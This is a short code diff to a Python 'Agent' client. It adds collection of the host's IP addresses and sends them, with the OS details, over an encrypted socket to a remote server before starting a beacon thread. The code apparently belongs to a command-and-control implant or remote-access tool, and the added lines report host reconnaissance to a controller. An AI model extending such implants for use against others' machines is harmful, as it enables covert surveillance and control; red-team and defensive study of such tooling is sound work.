@@ -27,6 +27,8 @@ os_info = {
         "Platform": platform.platform(),
         "Architecture": platform.architecture()[0]
     }
+ip_info = {info[4][0] for info in socket.getaddrinfo(socket.gethostname(), None)}
+
 # Create a socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 b_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -79,7 +81,8 @@ def start_conn():
             exit(1)
         
         sec_sendall(agent_name.encode(), sock, key, nonce) # send Agent's name
-        sec_sendall(json.dumps(os_info).encode(), sock, key, nonce) # send Agent's name
+        sec_sendall(json.dumps(os_info).encode(), sock, key, nonce) # send Agent's os_info
+        sec_sendall(str(ip_info).encode(), sock, key, nonce) # send Agent's ip_info
 
         print("*Successfully connected to server {}:{}".format(server_address,server_port))
         beacon_thread = threading.Thread(target=handle_beacon, args=(int.from_bytes(data,byteorder='big'), b_sock))
